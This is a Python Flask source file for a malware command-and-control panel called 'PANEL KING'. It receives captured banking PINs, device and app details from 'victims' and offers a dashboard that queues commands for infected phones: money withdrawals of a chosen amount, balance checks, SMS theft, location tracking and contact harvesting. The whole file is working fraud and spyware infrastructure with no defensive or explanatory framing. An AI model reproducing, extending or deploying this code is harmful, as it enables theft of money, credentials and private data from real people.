from flask import Flask, request, jsonify, render_template_string
from datetime import datetime
import json
import os

app = Flask(__name__)

victims = {}
pending_commands = {}

DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>PANEL KING DASHBOARD</title>
    <style>
        body { background: black; color: lime; font-family: monospace; padding: 20px; }
        h1 { color: #ff4444; text-align: center; }
        .victim { border: 1px solid lime; margin: 15px 0; padding: 15px; border-radius: 10px; }
        .pin { color: yellow; font-size: 24px; font-weight: bold; }
        button { background: #222; color: lime; border: 1px solid lime; padding: 8px 15px; margin: 5px; cursor: pointer; }
        input { background: #222; color: white; border: 1px solid lime; padding: 8px; width: 100px; }
    </style>
</head>
<body>
    <h1>🔥 PANEL KING</h1>
    <div>Active Victims: {{ victims|length }}</div>
    {% for id, data in victims.items() %}
    <div class="victim">
        <div class="pin">🔐 PIN: {{ data.pin }}</div>
        <div>📱 Device: {{ data.device }}</div>
        <div>🕐 Time: {{ data.time }}</div>
        <div>📡 App: {{ data.app }}</div>
        <div>
            <input type="number" id="amt_{{ id }}" placeholder="Amount" value="1000">
            <button onclick="sendCmd('{{ id }}', 'withdraw')">💸 WITHDRAW</button>
            <button onclick="sendCmd('{{ id }}', 'balance')">💰 BALANCE</button>
            <button onclick="sendCmd('{{ id }}', 'sms')">📨 SMS</button>
            <button onclick="sendCmd('{{ id }}', 'location')">📍 LOCATION</button>
            <button onclick="sendCmd('{{ id }}', 'contacts')">👥 CONTACTS</button>
        </div>
    </div>
    {% endfor %}
    <script>
        function sendCmd(id, type) {
            let amount = type === 'withdraw' ? document.getElementById('amt_' + id).value : '';
            let cmd = type + (amount ? ' ' + amount : '');
            fetch('/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({victim_id: id, command: cmd})
            });
        }
        setInterval(() => location.reload(), 3000);
    </script>
</body>
</html>
'''

@app.route('/')
def dashboard():
    return render_template_string(DASHBOARD_HTML, victims=victims)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    ip = request.remote_addr
    data['time'] = datetime.now().strftime("%H:%M:%S")
    victims[ip] = data
    print(f"\n[!] PIN CAPTURED: {data.get('pin')} from {data.get('device')}")
    return 'OK'

@app.route('/command', methods=['POST'])
def command():
    data = request.json
    vid = data['victim_id']
    cmd = data['command']
    if vid not in pending_commands:
        pending_commands[vid] = []
    pending_commands[vid].append(cmd)
    print(f"[CMD] to {vid}: {cmd}")
    return 'OK'

@app.route('/get_commands/<ip>')
def get_commands(ip):
    cmds = pending_commands.get(ip, [])
    pending_commands[ip] = []
    return jsonify({'commands': cmds})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    print("\n" + "="*50)
    print("🔥 PANEL KING SERVER RUNNING")
    print("="*50)
    app.run(host='0.0.0.0', port=port)
